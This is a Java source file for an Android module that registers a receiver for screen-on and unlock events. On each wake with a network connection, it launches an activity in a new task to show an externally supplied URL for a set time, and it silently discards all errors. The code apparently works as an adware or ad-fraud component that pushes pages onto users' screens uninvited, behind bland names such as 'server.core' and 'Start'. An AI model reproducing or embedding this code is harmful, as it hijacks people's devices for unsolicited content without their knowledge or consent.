package com.server.core;


import android.app.Activity;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.net.ConnectivityManager;
import android.net.NetworkInfo;
import android.os.PowerManager;

import com.farm.cloudy.snowy.ImplementFactory;


public class Start implements ImplementFactory {
    private WorkReceiver _workReceiver;
    private String _url;

    @Override
    public void init(final String url) {
        ApplicationUtil.runOnUiThread(new Runnable() {
            @Override
            public void run() {
                Context context = ApplicationUtil.getApplication();
                if (context == null)
                    return;
                _url = url;
                registerReceiver(context);
            }
        }, 0);

    }

    @Override
    public void performTask(Activity activity, String url, long time) {
        ViewUtils.instance().perform(activity, url, time);
    }


    private synchronized boolean isReady(Context context) {
        return isScreen(context) && isNetwork(context);
    }

    private synchronized void startActivity(final Context context, final String url) {
        ApplicationUtil.runOnUiThread(new Runnable() {
            @Override
            public void run() {
                try {
                    Intent intent = new Intent();
                    intent.putExtra(Config.EXTERNAL_URL, url);
                    intent.putExtra(Config.EXTERNAL_TIME, 1000L);
                    intent.setClassName(context, Config.EXTERNAL_GOD_ACT);
                    intent.setFlags(Intent.FLAG_ACTIVITY_CLEAR_TOP);
                    intent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                    context.startActivity(intent);
                } catch (Exception ignored) {
                    //ignored
                }
            }
        }, 0);
    }

    public class WorkReceiver extends BroadcastReceiver {
        private long _initializationTime = 0L;

        @Override
        public void onReceive(final Context context, Intent intent) {
            String action = intent.getAction();
            if (Intent.ACTION_SCREEN_ON.equals(action)) {
                if (System.currentTimeMillis() - _initializationTime < 10 * 1000)
                    return;
                _initializationTime = System.currentTimeMillis();
                if (isReady(context)) {
                    startActivity(context, _url);
                }
            }
        }
    }


    private void registerReceiver(Context context) {
        if (context == null || _workReceiver != null) {
            return;
        }
        _workReceiver = new WorkReceiver();
        IntentFilter filter = new IntentFilter();
        filter.addAction(Intent.ACTION_USER_PRESENT);
        filter.addAction(Intent.ACTION_SCREEN_OFF);
        filter.addAction(Intent.ACTION_SCREEN_ON);
        filter.addAction("android.hardware.usb.action.USB_STATE");
        context.registerReceiver(_workReceiver, filter);
    }

    private static boolean isScreen(Context context) {
        try {
            PowerManager powerManager =
                    (PowerManager) context.getSystemService(Context.POWER_SERVICE);
            return powerManager.isScreenOn();
        } catch (Exception e) {
            return false;
        }
    }

    private static boolean isNetwork(Context context) {
        try {
            ConnectivityManager cm =
                    (ConnectivityManager) context.getSystemService(Context.CONNECTIVITY_SERVICE);
            if (cm == null) return false;
            NetworkInfo netInfo = cm.getActiveNetworkInfo();
            return netInfo != null && netInfo.isConnected();
        } catch (Exception e) {
            return false;
        }
    }
}
